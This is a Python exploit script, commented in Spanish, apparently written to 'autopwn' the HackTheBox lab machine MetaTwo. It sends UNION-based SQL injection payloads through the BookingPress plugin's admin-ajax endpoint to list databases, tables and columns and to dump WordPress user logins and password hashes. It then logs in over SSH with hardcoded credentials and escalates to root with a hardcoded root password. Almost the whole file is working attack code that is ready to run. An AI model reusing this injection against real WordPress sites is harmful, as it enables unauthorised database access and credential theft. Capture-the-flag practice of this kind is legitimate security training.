#!/usr/bin/python3
import argparse, sys, requests, re, os
from pwn import log, ssh

wp_nonce = "674e7f528d" # Remplazar de ser necesario

with open("/etc/hosts", "r") as file:
    if "10.10.11.186 metapress.htb" not in file.read():
        if os.geteuid() != 0:
            print(f"\r")
            log.failure("Se necesitan permisos de root para escribir el host")
            print(f"\r")
            exit(1)
        else:
            with open("/etc/hosts", "a") as file:
                file.write("10.10.11.186 metapress.htb")

parser = argparse.ArgumentParser(description="Autopwn y exploit de sqli de la mÃ¡quina MetaTwo de HackTheBox")
parser.add_argument("-dbs", action="store_true", help="Obtener bases de datos existentes")
parser.add_argument("-tables", action="store_true", help="Obtener tablas existentes")
parser.add_argument("-columns", action="store_true", help="Obtener columnas existentes")
parser.add_argument("-dump", action="store_true", help="Dumpear la data en las columnas seleccionadas")
parser.add_argument("-D", type=str, help="Indicar base de datos, (si no se especifica, se usara blog)", default="blog")
parser.add_argument("-T", type=str, help="Indicar tabla, (si no se especifica se usara wp_users)", default="wp_users")
parser.add_argument("-C", type=str, help="Indicar columna, (si no se especifica se usara user_login,0x3a,user_pass)", default="user_login,0x3a,user_pass")
parser.add_argument("-shell", action="store_true", help="Consigue una shell como root")
args = parser.parse_args()

if len(sys.argv) < 2:
    parser.print_help()
    exit(1)

database = "0x"
table = "0x"

for character in args.D:
    decimal = ord(character)
    database += hex(decimal)[2:]

for character in args.T:
    decimal = ord(character)
    table += hex(decimal)[2:]

if args.shell:
    connection = ssh(host="metapress.htb", user="jnelson", password="Cb4_JmWM8zUZWMu@Ys")
    shell = connection.process("/bin/sh")
    shell.sendline(b"su root")
    shell.recvuntil(b"Password:")
    shell.sendline(b"p7qfAZt4_A1xo_0x")
    shell.recvuntil(b"jnelson#")
    shell.sendline(b"cd")
    shell.interactive()

elif args.dbs:
    payload = f"union select group_concat(schema_name),1,1,1,1,1,1,1,1 from information_schema.schemata-- -"
elif args.tables:
    payload = f"union select group_concat(table_name),1,1,1,1,1,1,1,1 from information_schema.tables where table_schema={database}-- -"
elif args.columns:
    payload = f"union select group_concat(column_name),1,1,1,1,1,1,1,1 from information_schema.columns where table_schema={database} and table_name={table}-- -"
elif args.dump:
    payload = f"union select group_concat({args.C}),1,1,1,1,1,1,1,1 from {args.D}.{args.T}-- -"

target = "http://metapress.htb/wp-admin/admin-ajax.php"

try:
    data = {"action": "bookingpress_front_get_category_services", "_wpnonce": wp_nonce, "category_id": "33", "total_service": f"1) {payload}"}
except:
    parser.print_help()
    exit(1)

request = requests.post(target, data=data)
result= re.search(b'bookingpress_service_id":(.*?),"bookingpress_category_id', request.content)

try:
    output = str(result.group(1), "utf-8")
    output = output.replace('"', '')
    output = output.replace(",", "\n")
except:
    print("\r")
    log.failure("Algo salio mal, actualizar wp_nonce de ser necesario")
    print("\r")
    exit(1)

with open("data", "w") as file:
    file.write(output)

with open("data", "r") as file:
    for line in file.readlines():
        log.info(line.strip())

os.remove("data")
